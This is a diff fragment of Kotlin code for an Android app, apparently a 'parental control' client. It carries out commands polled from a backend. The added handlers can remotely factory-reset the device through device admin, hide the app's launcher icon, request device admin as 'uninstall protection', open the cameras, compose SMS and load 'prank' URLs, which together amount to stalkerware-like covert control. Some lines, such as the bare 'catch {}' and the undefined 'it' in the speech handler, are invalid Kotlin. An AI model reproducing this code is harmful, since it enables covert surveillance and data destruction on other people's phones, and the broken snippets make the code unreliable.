+                    val am = getSystemService(AUDIO_SERVICE) as AudioManager
+                    am.ringerMode = AudioManager.RINGER_MODE_NORMAL
+                }
+                "vibrate_device" -> {
+                    val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
+                    v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
+                }
+                "volume_up" -> { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI) }
+                "volume_down" -> { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI) }
+                "volume_mute" -> { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0) }
+                "open_contacts" -> startActivity(Intent(Intent.ACTION_VIEW, ContactsContract.Contacts.CONTENT_URI))
+                "open_gallery" -> startActivity(Intent(Intent.ACTION_VIEW).apply { type = "image/*" })
+                "open_camera_front" -> startActivity(Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply { putExtra("android.intent.extras.CAMERA_FACING", 1) })
+                "open_camera_back" -> startActivity(Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE))
+                "compose_sms" -> {
+                    val to = cmd.optString("to")
+                    val body = cmd.optString("body")
+                    val intent = Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:$to")).apply { putExtra("sms_body", body) }
+                    startActivity(intent)
+                }
+                "open_gmail" -> startActivity(packageManager.getLaunchIntentForPackage("com.google.android.gm") ?: Intent(Intent.ACTION_VIEW, Uri.parse("https://mail.google.com")))
+                "open_whatsapp" -> startActivity(packageManager.getLaunchIntentForPackage("com.whatsapp") ?: Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me")))
+                "tts" -> {
+                    val text = cmd.optString("text")
+                    TextToSpeech(this) { status ->
+                        if (status == TextToSpeech.SUCCESS) {
+                            (it as? TextToSpeech)?.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
+                        }
+                    }
+                }
+                "open_location_settings" -> startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
+                "open_overlay_settings" -> startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+                "request_device_admin" -> {
+                    val cn = ComponentName(this, AdminReceiver::class.java)
+                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply { putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn) }
+                    startActivity(intent)
+                }
+                "factory_reset" -> {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                    val cn = ComponentName(this, AdminReceiver::class.java)
+                    if (dpm.isAdminActive(cn)) dpm.wipeData(0)
+                }
+                "enable_uninstall_protection" -> {
+                    val cn = ComponentName(this, AdminReceiver::class.java)
+                    startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply { putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn) })
+                }
+                "prank_video", "prank_audio" -> {
+                    val url = cmd.optString("url")
+                    if (url.isNotBlank()) {
+                        if (::web.isInitialized) web.loadUrl(url)
+                        else startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
+                    }
+                }
+                "flashlight_on", "flashlight_off" -> {
+                    try {
+                        val cm = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
+                        val id = cm.cameraIdList.firstOrNull()
+                        if (id != null) cm.setTorchMode(id, type == "flashlight_on")
+                    } catch {}
+                }
+                "hide_launcher" -> {
+                    packageManager.setComponentEnabledSetting(
+                        ComponentName(this, this::class.java),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                }
+                "show_launcher" -> {
+                    packageManager.setComponentEnabledSetting(
+                        ComponentName(this, this::class.java),
+                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        PackageManager.DONT_KILL_APP
+                    )
+                }
+            }
+        }
+        // Acknowledge command
+        if (cmdId.isNotBlank()) {
+            thread {
+                try {
+                    request("/api/devices/${deviceId}/commands/$cmdId", "DELETE", null,
+                        mapOf("X-Uid" to parentUid))
+                } catch {}
+            }
+        }
+    }
+
+    // ── HTTP helper ───────────────────────────────────────────────────────────
+    private fun request(path: String, method: String, body: String?, extraHeaders: Map<String, String>): JSONObject {
+        val url = URL("$backendUrl$path")
+        val conn = url.openConnection() as HttpURLConnection
         conn.requestMethod = method
-        conn.connectTimeout = 10_000
+        conn.connectTimeout = 15_000
         conn.readTimeout = 15_000
-        headers.forEach { (k, v) -> conn.setRequestProperty(k, v) }
+        conn.setRequestProperty("Content-Type", "application/json")
+        for ((k, v) in extraHeaders) conn.setRequestProperty(k, v)
         if (body != null) {
             conn.doOutput = true
-            conn.setRequestProperty("Content-Type", "application/json")
-            conn.outputStream.use { it.write(body.toByteArray()) }
+            conn.outputStream.write(body.toByteArray())
         }
         val code = conn.responseCode
-        val stream = if (code in 200..299) conn.inputStream else conn.errorStream
-        val text = stream?.bufferedReader()?.use { it.readText() } ?: ""
+        val stream = if (code < 400) conn.inputStream else conn.errorStream
+        val response = stream?.bufferedReader()?.readText() ?: "{}"
         conn.disconnect()
-        return Response(code, text)
+        return try { JSONObject(response) } catch { JSONObject().put("_raw", response) }
     }
 
-    override fun onBackPressed() {
-        if (::web.isInitialized && web.canGoBack()) web.goBack() else super.onBackPressed()
+    // ── URI helper ────────────────────────────────────────────────────────────
+    @Suppress("DEPRECATION")
+    private class URI(val s: String) {
+        val host: String get() = s.substringAfter("://").substringBefore(":").substringBefore("/")
+        val port: Int get() = try { s.substringAfter("://").substringAfter(":").substringBefore("/").toInt() } catch { -1 }
     }
 }
